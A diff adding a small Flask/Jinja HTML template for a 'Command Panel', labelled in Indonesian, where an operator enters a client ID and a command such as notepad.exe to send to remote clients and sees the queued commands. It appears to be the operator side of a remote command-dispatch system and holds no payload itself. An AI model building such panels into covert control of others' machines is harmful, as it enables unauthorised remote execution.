@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Command Panel</title>
+</head>
+
+<body>
+    <h2>Kirim Perintah ke Client</h2>
+    <form method="POST" action="/send_command">
+        <label>Client ID:</label><br>
+        <input type="text" name="client_id" required><br><br>
+        <label>Command (ex: notepad.exe):</label><br>
+        <input type="text" name="cmd" required><br><br>
+        <button type="submit">Kirim</button>
+    </form>
+
+    <h3>Command Aktif:</h3>
+    <ul>
+        {% for cid, cmd in commands.items() %}
+        <li><b>{{ cid }}</b>: {{ cmd }}</li>
+        {% else %}
+        <li><i>Belum ada perintah aktif</i></li>
+        {% endfor %}
+    </ul>
+</body>
+
+</html>
